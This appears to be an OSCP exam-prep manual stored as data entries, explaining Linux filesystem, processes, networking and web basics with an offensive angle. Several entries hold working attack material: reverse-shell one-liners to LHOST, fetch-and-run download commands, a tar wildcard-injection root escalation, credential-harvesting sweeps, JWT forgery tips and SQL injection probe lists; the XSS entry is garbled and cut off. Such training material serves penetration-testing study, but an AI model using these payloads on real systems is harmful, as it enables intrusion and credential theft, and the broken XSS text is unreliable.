meta.title: OSCP Manual — Linux & Kali fundamentals
meta.note: Core concepts explained as patterns, not formulas. Add your own to data/manual.json (see README).

entries.title: The filesystem hierarchy — one tree, by purpose
entries.brief: What lives where in /, and why it's organised that way
entries.body:
## One tree, rooted at /
Linux has no drive letters. Everything hangs off a single root `/`, and each top-level
directory has a *job*. Learn the jobs and you can guess where anything lives.

| Path | Purpose |
| --- | --- |
| / | the root of everything |
| /etc | system-wide configuration (text files) and startup scripts |
| /home, /root | user home directories; /root is the superuser's home |
| /bin, /sbin, /usr/bin | executables — user commands and admin binaries |
| /var | data that grows: logs (/var/log), mail, spools, web roots |
| /tmp | volatile scratch space, world-writable, cleared on reboot |
| /proc, /sys | virtual views into the kernel: processes, settings, hardware |
| /dev | device files — disks (/dev/sda), terminals, /dev/null |
| /opt, /srv | optional third-party software; service data |

## Paths: absolute vs relative
An **absolute** path starts at `/` (`/etc/passwd`) and is unambiguous anywhere. A **relative**
path is read from your current directory (`../logs`, `./run.sh`). `.` = here, `..` = parent.

## Hidden files
A leading dot hides a file from plain `ls` (`ls -a` shows them). They aren't secret — it's a
convention for config: `.bashrc`, `.ssh/`, `.git/`. On a target, dotfiles in a home dir often
hold history, keys and credentials.

## Why this matters offensively
Interesting reads cluster by purpose: creds/config in /etc and dotfiles, logs in /var/log,
running state in /proc (e.g. `/proc/<pid>/cmdline` can leak passwords passed on command lines),
writable scratch in /tmp for your tools.

entries.title: /etc/passwd — the seven fields
entries.brief: Each colon-separated component, and what it tells you on a box
entries.body:
## Seven fields, one line per account
/etc/passwd is **world-readable** (passwords are not here — they're hashed in /etc/shadow).
Each line is seven colon-separated fields:

    kali:x:1000:1000:Kali User,,,:/home/kali:/usr/bin/zsh
     1   2   3    4       5           6            7

| # | Field | Meaning |
| --- | --- | --- |
| 1 | username | the login name |
| 2 | password | `x` means the hash lives in /etc/shadow (legacy systems sometimes put it here) |
| 3 | UID | user id — **0 = root**, 1-999 = system/service accounts, 1000+ = normal users |
| 4 | GID | the user's primary group id (names in /etc/group) |
| 5 | GECOS | comment: full name / contact, comma-separated (often empty, e.g. `,,,`) |
| 6 | home | home directory |
| 7 | shell | the program login runs — /bin/bash, /usr/bin/zsh, or a lock like /usr/sbin/nologin |

## What it tells you on a target
- **Any account with UID 0 is root** — a non-root name with UID 0 is a backdoor.
- UID >= 1000 are the real humans — your likely targets and password-reuse victims.
- Shell = `nologin`/`false` -> service account, not interactively reachable (see: user-shells in `oscp methods`).
- A service account (e.g. `postgres`) with `/bin/bash` instead of nologin is suspicious — and a possible foothold.

## Quick reads
    awk -F: '{print $1, $3, $7}' /etc/passwd                 # name, uid, shell
    awk -F: '$3>=1000 && $3<65534 {print $1}' /etc/passwd    # real users
    awk -F: '$3==0 {print $1}' /etc/passwd                   # every root-equivalent account

entries.title: Finding a command: which vs whereis vs type -p
entries.brief: Three locators, the alias trap, and why -p is the precise one
entries.body:
## Three ways, three answers
    which nmap        # first match in $PATH only — what WOULD run (the first-hit rule)
    whereis nmap      # binary + source + man-page locations (standard dirs, not just $PATH)
    type -a nmap      # how the SHELL resolves it: alias, function, builtin, or $PATH hits — all of them

## The alias trap
On Kali, `ls` is aliased to `ls --color=auto`. Watch the difference:

    which ls          # /usr/bin/ls        — `which` knows nothing about shell aliases
    type ls           # ls is an alias for ls --color=auto
    type -p ls        # /usr/bin/ls        — `-p` = path only: ignore alias/function/builtin

`type -p` is the precise one — it prints the *file* that would run as if no alias or function
existed, which is exactly what a script sees (scripts don't load your interactive aliases).

## Why it matters
- Interactively, an alias can change what a name does — `type` reveals it.
- A script or a privileged cron job ignores your aliases and uses the $PATH binary — `type -p`/`which`.
- For privesc, the *real file* (type -p) is what you inspect for the SUID bit, capabilities, or a PATH-hijack chance.

## Rule of thumb
`type -a` to see what your shell will do; `type -p` (or `which`) for the real file a script runs.

entries.title: Inodes, hard links and symlinks
entries.brief: A name is not the file — what an inode is and how the two link types differ
entries.body:
## The key idea: a name is not the file
On Linux the file's data and metadata live in an **inode** (a numbered record: size,
owner, permissions, timestamps, and pointers to the data blocks). A *filename* is just a
directory entry that points at an inode. `ls -i` shows the inode number.

## Hard link vs symbolic link
- A **hard link** is another directory entry pointing at the **same inode**. Both names are
  equal; the data survives until the last name is removed. Can't cross filesystems or link dirs.
      ln target.txt second-name        # same inode, same data
- A **symlink** is a tiny file that just stores a **path** to another name. If the target is
  renamed/removed, the symlink dangles. Crosses filesystems; can point at directories.
      ln -s /opt/tool/bin/t /usr/local/bin/t

## Why it matters offensively
- Timestamps: the inode tracks **A**ccess, **M**odify, and **C**hange times (`stat file`).
  "Change" is when the inode itself changed (perms/owner) — useful for spotting tampering.
- Symlink tricks: a privileged process that writes to a predictable path can be redirected
  with a symlink (classic race/`/tmp` issues).
- Deleting a file that a process still holds open frees the name but not the inode — the data
  is still readable via `/proc/<pid>/fd/`.

entries.title: Streams, redirection and pipes
entries.brief: stdin/stdout/stderr and how >, >>, <, | and 2>&1 wire them together
entries.body:
## Three streams every process has
- **stdin** (fd 0) — input
- **stdout** (fd 1) — normal output
- **stderr** (fd 2) — error output (kept separate on purpose)

## Redirection rewires a stream to a file
    cmd > out.txt      # stdout -> file (overwrite)
    cmd >> out.txt     # stdout -> file (append)
    cmd < in.txt       # file  -> stdin
    cmd 2> err.txt     # stderr -> file
    cmd > all.txt 2>&1 # stderr -> wherever stdout currently points (merge both)  — order matters
    cmd 2>/dev/null    # discard errors (throw them into the bit-bucket)

## Pipes wire one process's stdout into the next's stdin
    cat /etc/passwd | grep bash | cut -d: -f1
Each `|` is a direct hand-off — no temp file. This is the core Unix idea: small tools that
each do one thing, composed into a pipeline.

## Why it matters
- `2>/dev/null` cleans noisy privesc scans (`find / -perm -4000 2>/dev/null`).
- `2>&1` matters when you want errors captured too (and its position is significant).
- A reverse shell is literally redirection over a socket: stdin/stdout/stderr wired to a TCP
  connection (`bash -i >& /dev/tcp/LHOST/LPORT 0>&1`).

entries.title: Processes, jobs and signals
entries.brief: PIDs, viewing processes, job control, and what kill actually does
entries.body:
## A process is a running program with a PID
The kernel gives every process a numeric **PID**. Each has an owner (uid), a parent, and an
environment. See them:

    ps aux                 # snapshot of all processes (user, pid, cpu, mem, command)
    ps -ef                 # same idea, parent-pid shown (PPID)
    top    /   htop        # live, interactive view

## Job control (within one shell)
    long-cmd &             # start in the background
    Ctrl-Z                 # suspend the foreground job
    jobs                   # list this shell's jobs
    bg %1  /  fg %1        # resume job 1 in background / foreground

## Signals: kill doesn't (only) kill
`kill` sends a **signal**; the program decides how to react.
    kill 15 <pid>  (SIGTERM)   # polite "please exit" — default; lets it clean up
    kill -9 <pid>  (SIGKILL)   # forced, uncatchable — last resort, no cleanup
    kill -1 <pid>  (SIGHUP)    # often "reload config"
    killall <name>             # by process name

## Why it matters
- `ps aux` can expose credentials passed on the command line (and `/proc/<pid>/cmdline`).
- Watching processes (`pspy`, or spotting a root cron in `ps`) reveals privesc paths.
- Know SIGTERM vs SIGKILL: give a process a chance to flush before you -9 it.

entries.title: systemd: services and the journal
entries.brief: How daemons are controlled and where their logs go
entries.body:
## systemd is the init system
PID 1 on modern Debian/Kali is **systemd** — it boots userspace and supervises long-running
**services** (units). You control units with `systemctl` and read their logs with `journalctl`.

    systemctl status ssh          # is it running? recent log lines
    systemctl start|stop ssh      # control it now
    systemctl enable|disable ssh  # start at boot or not  (enable != start)
    systemctl list-units --type=service --state=running

## The journal
    journalctl -u ssh             # logs for one unit
    journalctl -f                 # follow (live tail)
    journalctl -p err -b          # errors since this boot

## enable vs start — a common confusion
`start` affects *now*; `enable` affects *next boot*. You usually want both for a persistent
service. On a box, a service you can edit the unit file for (then `restart` as root) is a
privesc path; a writable service binary that runs as root is another.

entries.title: Packages: apt, dpkg and sources
entries.brief: How Debian/Kali install software, and where that config lives
entries.body:
## Two layers: apt over dpkg
- **dpkg** is the low-level tool that installs/queries a single `.deb` file. It does *not*
  resolve dependencies.
- **apt** is the high-level front end: it talks to repositories, resolves dependencies, and
  calls dpkg to do the install.

    sudo apt update                 # refresh the local package index (does NOT upgrade)
    sudo apt install nmap           # resolve deps + install
    sudo apt upgrade                # upgrade installed packages
    sudo apt full-upgrade           # upgrade, allowing removals for big transitions
    dpkg -i ./tool.deb              # install a local .deb (then: sudo apt -f install to fix deps)
    dpkg -L nmap                    # list files a package installed
    dpkg -S /usr/bin/nmap           # which package owns a file

## Where the config lives
- /etc/apt/sources.list and /etc/apt/sources.list.d/* — the repository URLs.
- apt caches downloaded .debs in /var/cache/apt/archives.

## Why it matters
`dpkg -S` / `dpkg -L` quickly tell you what a binary is and what shipped with it. On an
air-gapped target you often transfer and `dpkg -i` a static tool rather than apt-install.

entries.title: cron — scheduled tasks (and the privesc angle)
entries.brief: How recurring jobs are defined, and why attackers read them first
entries.body:
## cron runs commands on a schedule
A **crontab** line is five time fields plus a command:

    # m h dom mon dow   command
      */5 * * * *        /opt/backup.sh        # every 5 minutes
      0   2 * * *        /usr/bin/find /tmp -mtime +7 -delete   # 02:00 daily

- Per-user crontabs: `crontab -l` (list), `crontab -e` (edit).
- System crontab: /etc/crontab and /etc/cron.d/* (these have an extra *user* field).
- Drop-in dirs run on a cadence: /etc/cron.{hourly,daily,weekly,monthly}.

## Why it's the first privesc check after SUID/sudo
A cron job often runs **as root** on a timer. If you can influence what it runs — a
world-writable script, a wildcard you can abuse, a relative path resolved via a $PATH you
control — you get root on the next tick.

    cat /etc/crontab; ls -la /etc/cron.d/
    # watch jobs fire in real time (no root needed):
    ./pspy64

## Pattern
"A command that runs as root, on a schedule, whose inputs I might control." Find it, control
an input, wait for the tick.

entries.title: Networking basics: addresses, routes, sockets, names
entries.brief: ip/ss and the two files that control name resolution
entries.body:
## See your network state
    ip addr            # interfaces and their IPs  (lo, eth0, tun0 for the VPN)
    ip route           # routing table — which gateway reaches what
    ss -tlnp           # listening TCP sockets + the owning process (-u for UDP)
    ping -c1 TARGET    # ICMP reachability

`ss` replaces the old `netstat`; `ip` replaces `ifconfig`/`route`. `-n` keeps output numeric
(no slow DNS), `-p` shows the process (needs privilege for others').

## Name resolution: two local files
- /etc/hosts — static name->IP map, checked **before** DNS. Add a box here to use a hostname
  (many web apps answer only on a vhost):  `echo "$TARGET box.htb" | sudo tee -a /etc/hosts`
- /etc/resolv.conf — which DNS servers to ask when a name isn't in /etc/hosts.

## Why it matters
- `ss -tlnp` on a shell reveals services bound to localhost only — invisible to your nmap but
  reachable once you're on the box (pivot/port-forward candidates).
- `ip addr` confirms your tun0 IP for LHOST; `ip route` shows internal subnets to pivot into.

entries.title: Shell startup files, aliases and variables
entries.brief: What runs when a shell opens, and env vs local variables
entries.body:
## What runs when a shell opens
- Interactive shells read per-user startup files: **~/.bashrc** (bash) or **~/.zshrc** (zsh,
  Kali's default). Login shells also read ~/.profile / ~/.zprofile.
- These set your `PATH`, aliases, prompt, and functions. That's why a new terminal "already
  knows" your customisations.

## Aliases and functions
    alias ll='ls -la'          # a shorthand, expanded only in interactive shells
Scripts do **not** load your aliases — another reason `type -p` (real file) matters.

## Variables: local vs environment
    NAME=value          # a LOCAL shell variable — only this shell sees it
    export NAME=value   # an ENVIRONMENT variable — child processes inherit it
    env | grep NAME     # list environment variables
Common env vars: `PATH` (command search), `HOME`, `USER`, `SHELL`, `PWD`. See the deeper
logic in `oscp methods show path-variable` and `target-variable`.

## Why it matters
- Writable startup files = persistence/escalation (code runs on next login).
- On a target, read other users' ~/.bashrc, ~/.zsh_history, ~/.bash_history for creds and clues.

entries.title: Permissions, chmod, SUID — see oscp methods
entries.brief: The rwx grid, symbolic/octal, and special bits are covered in methods
entries.body:
## Where the deep dive lives
The full mental model for permissions — the 3x3 **rwx x ugo** grid, symbolic `+/-/=`, octal
numbers, and the special **SUID/SGID/sticky** bits — is in the methods library:

    oscp methods show permissions-model
    oscp methods show gtfobins-logic      # how SUID/sudo become root

## One-line refreshers
    ls -l file                 # read the current bits:  -rwxr-x---
    chmod 750 file             # octal: owner rwx, group r-x, others none
    chmod u+x,g-w file         # symbolic tweak
    find / -perm -4000 -type f 2>/dev/null   # SUID-root hunt
    umask                      # the mask subtracted from default perms on new files (e.g. 022)

## umask in one sentence
New files start from a base (666 files / 777 dirs) with the `umask` bits removed — `umask 022`
yields 644 files and 755 dirs. It decides the *default* permissions of everything you create.

entries.title: Getting files on and off a target
entries.brief: The patterns for moving tools in and loot out — pick what the box has
entries.body:
## The problem, and the pattern
Once you have a shell you need YOUR tools on the box, and the box's files back on YOURS.
There is no single command — you use whatever the target already has. Serve from your box,
pull from theirs.

## Serve from your attacker box
    python3 -m http.server 80            # serves the current dir over HTTP
    python3 -m http.server 8000          # unprivileged port
    impacket-smbserver share . -smb2support   # an SMB share (great for Windows)

## Pull onto a Linux target
    wget http://LHOST/linpeas.sh -O /tmp/lp.sh
    curl http://LHOST/linpeas.sh -o /tmp/lp.sh
    curl http://LHOST/t | bash                 # fetch and run without touching disk

## Pull onto a Windows target
    certutil -urlcache -f http://LHOST/nc.exe nc.exe
    powershell -c "iwr http://LHOST/nc.exe -OutFile nc.exe"
    powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/x','x')"

## When there's no HTTP out — improvise
    # base64 a small file, paste it, decode on the other side:
    base64 -w0 secret.kdbx            # on source; copy the blob
    echo '<blob>' | base64 -d > secret.kdbx   # on destination
    nc -lvnp 4444 > out               # receiver;  nc LHOST 4444 < file  (sender)
    scp file user@TARGET:/tmp/        # if you have SSH creds

## Pattern
"Which direction, and what does this box already have (http? smb? nc? base64? ssh?)." Serve on
one side, fetch on the other.

entries.title: Reverse vs bind shells — who connects to whom
entries.brief: The core idea behind catching a shell, and why reverse usually wins
entries.body:
## Two directions
A shell over the network is just a program's stdin/stdout/stderr wired to a TCP socket. Two
ways to set up that socket:

- **Bind shell** — the *target* listens on a port; *you* connect to it. Fails when a firewall
  blocks inbound to the target (common).
- **Reverse shell** — *you* listen; the *target* connects back to you. Usually works, because
  outbound connections are more often allowed than inbound. This is the default choice.

## Catch it (your box)
    nc -lvnp 4444          # listen: -l listen, -v verbose, -n no DNS, -p port

## Trigger it (the target), a few flavours
    bash -i >& /dev/tcp/LHOST/4444 0>&1          # pure bash, no nc needed
    nc -e /bin/bash LHOST 4444                   # if nc has -e
    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

The bash one-liner IS redirection: `>&` sends stdout+stderr to the /dev/tcp socket, `0>&1`
points stdin at the same place. (See: redirection-and-pipes.)

## After you catch it
Upgrade the raw shell to a TTY before real work — `oscp methods show shell-tty`. Generate more
payloads quickly at revshells.com (`oscp bm open <revshells id>`).

## Pattern
"Who can initiate the connection?" If the target can't accept inbound, make it dial out —
reverse shell.

entries.title: SSH key authentication (and why permissions bite)
entries.brief: Public/private keypairs, the files involved, and the common gotchas
entries.body:
## The idea
Instead of a password, SSH can authenticate with a **keypair**: a private key you keep, and a
public key placed on the server. The server proves you hold the private key without it ever
crossing the wire.

## The files
- `~/.ssh/id_rsa` (or id_ed25519) — your **private** key. Secret. Must be `chmod 600`.
- `~/.ssh/id_rsa.pub` — the **public** key. Goes on servers.
- Server side: `~/.ssh/authorized_keys` — public keys allowed to log in as that user.
- `~/.ssh/known_hosts` — server fingerprints you've accepted.

## Use it
    ssh-keygen -t ed25519 -f ./key            # make a pair
    ssh -i ./key user@TARGET                  # log in with a specific key
    cat key.pub >> ~/.ssh/authorized_keys     # authorise a key (on the server)

## The gotcha
SSH **refuses a private key that others can read**:  "UNPROTECTED PRIVATE KEY FILE". Fix:
    chmod 600 key

## Why it matters offensively
- Found a readable `id_rsa` on a box? That's a login to wherever its `.pub` is authorised —
  often another user or host. `chmod 600` your copy and `ssh -i`.
- **Write** access to someone's `~/.ssh/authorized_keys` = add your key = log in as them.
- A private key with a passphrase can be cracked offline: `ssh2john key > h; john h`.

entries.title: Globbing, brace expansion — and wildcard injection
entries.brief: How the shell expands *, ?, [] before the command runs, and how that's abused
entries.body:
## The shell expands first
`*`, `?`, `[...]` are **glob** patterns the *shell* expands into matching filenames **before**
the command ever runs. `rm *.log` becomes `rm a.log b.log`. The command sees the expanded list,
not the `*`.

    *        any run of characters      ls *.txt
    ?        exactly one character       ls file?.txt
    [abc]    one of a set                ls [ab]*.sh
    {a,b,c}  brace expansion (not a glob) echo file{1,2,3}.txt  -> file1.txt file2.txt file3.txt

Quote to pass a literal: `grep "*" file` searches for an asterisk; `grep * file` expands first.

## Why this is a privesc classic: wildcard injection
If a privileged job runs a command with a bare `*` in a directory you can write to, you control
what the `*` expands into — and some tools read filenames as **options**. Create files whose
names ARE options.

    # a root cron that runs:  tar czf backup.tar.gz *   in /home/you
    echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > shell.sh
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh shell.sh'
    # tar now runs your script as root on the next tick

`chown`, `chmod`, `rsync`, `tar` are classic targets. (See: cron-scheduling, gtfobins-logic.)

## Pattern
"The shell expands the glob before the program runs, and filenames can look like options." If
you control a directory a privileged `*` runs in, you control the arguments.

entries.title: Disks, mounts and fstab
entries.brief: Device naming, attaching filesystems, and where auto-mounts are configured
entries.body:
## Devices have predictable names
    /dev/sda, /dev/sdb         # SATA/USB disks;  sda1, sda2 = partitions
    /dev/nvme0n1, ...p1        # NVMe disks
    lsblk                      # tree of disks, partitions and mountpoints
    blkid                      # filesystem types and UUIDs

## Mounting attaches a filesystem into the tree
Linux has one tree; a disk's contents appear at a **mountpoint** you choose.
    sudo mount /dev/sdb1 /mnt          # attach
    sudo umount /mnt                   # detach
    mount                              # list what's mounted and how

## Persistent mounts: /etc/fstab
`/etc/fstab` lists filesystems mounted automatically at boot (device/UUID, mountpoint, type,
options). A mistake here can stop a boot — and an entry mounting something `nosuid`/`nodev` is
a security control.

## Why it matters offensively
- Extra partitions/LVM volumes may hold data not visible from `/` — `lsblk` reveals them.
- `mount` can show NFS/SMB shares and their options (e.g. `no_root_squash` on NFS = write a
  SUID binary as root from your box).
- A writable /etc/fstab (as root) is persistence; unusual mount options are worth reading.

entries.title: Host firewalls: iptables / nftables
entries.brief: How packet filtering is structured, and what to check on a box
entries.body:
## The model
A Linux host filters packets with rules grouped into **chains** inside **tables**. For plain
filtering the table is `filter` with three chains:
- **INPUT** — packets destined for this host
- **OUTPUT** — packets this host sends
- **FORWARD** — packets routed through it

Each rule matches (protocol, port, source...) and jumps to a target: `ACCEPT`, `DROP`, `REJECT`.
First match wins; the chain's **policy** is the default if nothing matches.

## Read the current rules
    sudo iptables -L -n -v        # list filter rules, numeric, with counters
    sudo iptables -S              # as the commands that created them
    sudo nft list ruleset         # the modern nftables equivalent

## Add / allow (examples)
    sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # allow inbound SSH
    sudo iptables -P INPUT DROP                           # default-deny inbound

## Why it matters offensively
- Explains why a *bind* shell fails but a *reverse* shell works (INPUT DROP, OUTPUT ACCEPT).
- Reveals ports filtered to the outside but open locally — pivot/forward targets.
- `nftables` is replacing `iptables` on modern Debian/Kali; the command differs, the model is
  the same.

entries.title: Encoding: base64, hex, URL — not encryption
entries.brief: What these transforms are for, and why they show up everywhere in offsec
entries.body:
## Encoding != encryption
Encoding reversibly reshapes data so it survives a channel (text-only, a URL, a shell). It is
**not** secret — anyone can decode it. Recognise and flip it instantly.

## base64 — binary-safe text
    echo -n 'data' | base64            # encode  ->  ZGF0YQ==
    echo 'ZGF0YQ==' | base64 -d        # decode
    base64 -w0 file                    # no line wrapping (one blob) — handy for pasting
Uses: moving binaries through text-only shells (see file-transfer), obfuscated payloads
(`powershell -enc <b64>`), and tokens (a JWT is three base64url parts split by `.`).

## hex
    xxd file | head           # inspect bytes
    echo -n 'AB' | xxd -p     # 4142
    echo 4142 | xxd -r -p     # back to AB

## URL-encoding
Web input encodes unsafe characters as `%XX`: space -> `%20`, `/` -> `%2F`. It matters when
crafting payloads in URLs/params.
    python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "a b/c"

## Pattern
See `==` padding or `%` sequences or all-hex? It's encoded, not encrypted — decode it and read
the real value. This is a daily reflex in OSWE web work and in reading payloads.

entries.title: Where credentials hide on a box
entries.brief: A checklist of the usual places secrets leak, after you get a shell
entries.body:
## Why this is its own skill
Most privesc and lateral movement is really *credential reuse*. After a foothold, your job is
to harvest secrets — then try them everywhere.

## The usual places
- **History & shell files**: ~/.bash_history, ~/.zsh_history, ~/.bashrc, ~/.profile.
- **App & service config**: anything under /etc, /var/www (wp-config.php, .env, settings.py),
  database configs, `*.conf`, `*.ini`, `*.yml`.
- **Home dirs**: ~/.ssh/ keys, ~/.git-credentials, ~/.aws/credentials, ~/.docker/config.json,
  KeePass `.kdbx`, browser profiles.
- **Process list & env**: `ps auxww` and /proc/<pid>/cmdline (passwords on command lines),
  `env` / /proc/<pid>/environ.
- **Memory & dumps**: lsass dumps (Windows), core files, backups (*.bak, *.old).

## Fast sweeps
    grep -rniE 'password|passwd|secret|api[_-]?key|token' /etc /var/www 2>/dev/null
    find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.pem' 2>/dev/null
    history; cat ~/.*_history 2>/dev/null

## Then: reuse
A password found for one user/service is a candidate **everywhere** — SSH, sudo, SMB, the DB,
the web login, other users. Spray it (see: stuck-checklist). Password reuse is the single most
productive assumption in these exams.

entries.title: HTTP: the request/response you'll attack
entries.brief: Methods, status codes and headers — the anatomy every web attack builds on
entries.body:
## One request, one response
HTTP is text. A client sends a **request** (method + path + headers + optional body); the server
returns a **response** (status + headers + body). Every web attack is a crafted request.

    GET /search?q=test HTTP/1.1        <- method, path+query, version
    Host: target.local                 <- headers
    Cookie: session=abc                 (blank line)
                                        <- body (for POST/PUT)

## Methods (verbs)
    GET     fetch (params in the URL/query)
    POST    submit (params in the body) — logins, forms
    PUT/DELETE  create/remove (often REST APIs)
    HEAD    headers only;  OPTIONS  what methods are allowed

## Status codes — the first digit tells the story
    2xx ok (200 OK, 201 created)
    3xx redirect (301/302 -> follow with curl -L)
    4xx client error (401 auth needed, 403 forbidden, 404 not found)
    5xx server error (500 — often where a bug/stack trace leaks)

## Headers that matter offensively
`Cookie`/`Set-Cookie` (sessions), `Authorization` (Bearer/Basic), `Content-Type`
(form vs JSON — change it to bypass parsers), `Location` (redirect target), `Server`/
`X-Powered-By` (tech/version).

## Pattern
"What request produces what response?" Use `curl -v` to see both raw, then change one piece at
a time. This is the whole loop of OSWE web work.

entries.title: Sessions, cookies and JWTs
entries.brief: How the server remembers you, and where that trust breaks
entries.body:
## The problem HTTP has
HTTP is stateless — each request stands alone. To know "you're logged in", the server issues a
token after login and the browser returns it on every request. Two common designs:

## Server-side sessions (opaque cookie)
    Set-Cookie: session=random123; HttpOnly; Secure; SameSite=Lax
The cookie is just a **random id**; the real data lives server-side. Attacks: steal/guess the
id (session hijacking/fixation), or weak randomness. Flags: `HttpOnly` (JS can't read it),
`Secure` (HTTPS only), `SameSite` (CSRF defence).

## JWT (self-contained token)
A JWT is three base64url parts: `header.payload.signature`.
    eyJhbG...  .  eyJ1c2Vy...  .  <sig>
The payload holds claims (user, role, exp) — **readable by anyone** (base64, not encrypted).
The signature is what stops tampering. Classic flaws:
- `alg: none` accepted -> drop the signature and forge claims.
- weak HMAC secret -> crack it offline, then re-sign as admin.
- RS256 confused for HS256 -> sign with the public key as the HMAC secret.

    echo '<payload-part>' | base64 -d    # read the claims
    # crack an HS256 secret:  john jwt.txt --wordlist=rockyou.txt  (or hashcat -m 16500)

## Pattern
"What is the token, and what proves it's authentic?" If you can read, forge or replay it, you
become someone else.

entries.title: SQL injection — the logic, not the payload
entries.brief: The probes that find a SQL injection: quote, number, boolean, login, LIKE, sort, sleep
entries.body:
## The root cause
The app builds a SQL query by **gluing your input into a string**. If the input isn't separated
from the code, your input *becomes* code.

    query = "SELECT * FROM users WHERE name='" + input + "'"
    input = admin'  ->  ...WHERE name='admin'  '   (broken quote -> error = a signal)
    input = ' OR '1'='1  ->  ...WHERE name='' OR '1'='1'   (always true -> auth bypass)

## Find it
Send one probe at a time, in the same place a normal value goes: a parameter, a form field, a
cookie, or a header. Compare every response to a request you already know is good.

A hit is one of three things.
- A database error or a 500. Search the body for these words:
      SQL syntax
      mysql / MariaDB
      ORA-
      PostgreSQL
      SQLite
      ODBC
      Unclosed quotation
      quoted string not properly terminated
- The page changes: more rows, a login that succeeds, a different length, a missing result.
- A delay of about five seconds on a sleep probe, and no delay on its false twin.

Stop at the first pair where true and false disagree. That disagreement is the bug. Send them in
this order. It covers a quoted string, a number, a login, a search box, a sort column, and a
sleep.

Quoted string. A quote closes the string early. Add a parenthesis when the value sits inside a
function call. A backslash matters on MySQL, because it escapes the next quote.
    '
    ')
    '))
    "
    \

Numeric, when the query does not wrap the value in quotes. `2-1` must look like the original `1`.
`1 AND 1=2` must not.
    2-1
    1 AND 1=1
    1 AND 1=2

Boolean, with a comment. True and false have to differ. `--` needs a following space, which is
why the probe ends in `-- -`.
    ' OR 1=1-- -
    ' OR 1=2-- -
    ' OR '1'='1'-- -
    ' OR '1'='2'-- -

Login field. The query's own closing quote can finish the statement, so a comment is optional.
Try the true line in the username and again in the password.
    ' OR '1'='1
    ' OR '1'='2
    admin'-- -
    admin'#

Search box that uses LIKE. A bare percent sign that returns extra rows is already a candidate.
    %
    ' OR '%'='

Sort, order, or a column name. A quote, then a column index that exists versus one that does not.
    '
    1
    999

A different comment, when `-- -` was swallowed. `#` is MySQL. `/*` needs no trailing space.
    ' OR 1=1#
    ' OR 1=1/*
    ' OR 1=2#

Time, and only when true and false still look the same. One of these sleeps for five seconds.
The dialect that ignores it is the database you are not on.
    ' AND SLEEP(5)-- -
    '; WAITFOR DELAY '0:0:5'-- -
    ' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -

Extraction after that confirmation is the next section. Per-character blind, and the other
dialects, are blind-sqli.

## Exploit it (two shapes)
- **UNION-based**: when results are shown, append `UNION SELECT` to pull other tables/columns.
      ' UNION SELECT username,password FROM users-- -
- **Blind**: no output, but true/false changes behaviour or timing.
      ' AND 1=1-- -   vs   ' AND 1=2-- -      (boolean)
      ' AND SLEEP(5)-- -                      (time-based)

`sqlmap -u URL --batch` automates it, but understand the manual logic first (OSCP limits
automated tools).

## The fix (what you're bypassing)
Parameterised queries keep data and code separate — the input can never become SQL.

## Pattern
"Does my input change the query's meaning?" Break it, confirm true/false, then extract.

entries.title: Cross-site scripting (XSS) — your script in their page
entries.brief: Reflected, stored, DOM — the same root cause, three deliveries
entries.body:
## The root cause The app puts **your input into a page without encoding it**, so the browser runs your input as HTML/JavaScript in another user's session.
Hello
name = -> the script runs in the victim's browser ## Three deliveries, one cause - **Reflected** — input echoed straight back in the response (a link/param). Needs the victim to click your crafted URL. - **Stored** — input saved and shown to others later (a comment, profile). Fires for everyone who views it — the most dangerous. - **DOM-based** — client-side JS writes your input into the page (`innerHTML`, `location`). The server may never see the payload. ## What it buys an attacker Running JS as the victim: steal their cookie/session, make requests as them, keylog, pivot an admin into doing your bidding. ## Find it Inject a marker (`xss123`) and see if it renders as **bold** instead of text. If it renders, encoding is missing. Try `

entries.title: Pivoting with a SOCKS proxy + proxychains
entries.brief: Using a foothold as a gateway into a network you can't reach directly
entries.body:
## The problem
You own host A (reachable), but the juicy hosts are on an internal subnet only A can talk to.
A **pivot** routes your tools through A into that network.

## The simplest pivot: SSH dynamic forward (SOCKS)
    ssh -D 1080 user@A -N          # A becomes a SOCKS5 proxy on your localhost:1080
Then send tools through it with **proxychains** (edit /etc/proxychains4.conf -> `socks5 127.0.0.1 1080`):
    proxychains nmap -sT -Pn -p 80,445,3389 10.10.20.5
    proxychains curl http://10.10.20.5
Use `-sT -Pn` through SOCKS (connect scan; raw packets don't traverse a proxy).

## No SSH creds on A? Carry a tool
- **chisel**:  server on your box, client on A -> reverse SOCKS tunnel.
      # you:  ./chisel server -p 8000 --reverse
      # A:    ./chisel client LHOST:8000 R:socks
- **ligolo-ng**: a tun interface so tools run *natively* (no proxychains), cleaner for AD.

## Pattern
"Which host can reach the target, and can I turn it into a proxy?" Stand up a SOCKS/tunnel
through the foothold, then point your tools at the internal IPs through it. Chain pivots for
deeper subnets.

entries.title: Port forwarding: local, remote, dynamic
entries.brief: The three SSH forward directions and when to use each
entries.body:
## Forwarding moves a port across the tunnel
Three shapes, decided by *which side listens* and *which side the traffic ends up on*.

## Local (-L): reach a remote service from your box
    ssh -L 8080:127.0.0.1:8080 user@TARGET -N
Opens **your** localhost:8080; connections tunnel to TARGET and then to 127.0.0.1:8080 *from
TARGET's view*. Use it to reach a service bound to the box's loopback (DB, admin panel).

## Remote (-R): expose YOUR service to the remote side
    ssh -R 4444:127.0.0.1:4444 user@TARGET -N
Opens a listener on **TARGET**; its connections come back to your localhost:4444. Use it to
catch a reverse shell from a host that can only reach TARGET, not you.

## Dynamic (-D): a whole-network proxy
    ssh -D 1080 user@TARGET -N
A SOCKS proxy — not one port but any host:port the target can reach (see: proxychains-pivoting).

## Reading it
"-L = pull a remote port to me; -R = push my port to them; -D = proxy everything." `-N` means
"no shell, just the tunnel"; `-f` backgrounds it.

## Pattern
Name what you want reachable and from where, then pick the direction. Without SSH, chisel/
socat/ligolo do the same forwards.

entries.title: Windows from a Linux attacker's seat
entries.brief: cmd vs PowerShell, where things live, and the first enum commands
entries.body:
## Two shells
- **cmd.exe** — legacy; simple built-ins (`dir`, `type`, `whoami`).
- **PowerShell** — object-based, far more capable; what you'll usually upgrade to.
      powershell -ep bypass        # relax the execution policy for your session

## First orientation (the Windows `id`/`sudo -l`)
    whoami                 # domain\user
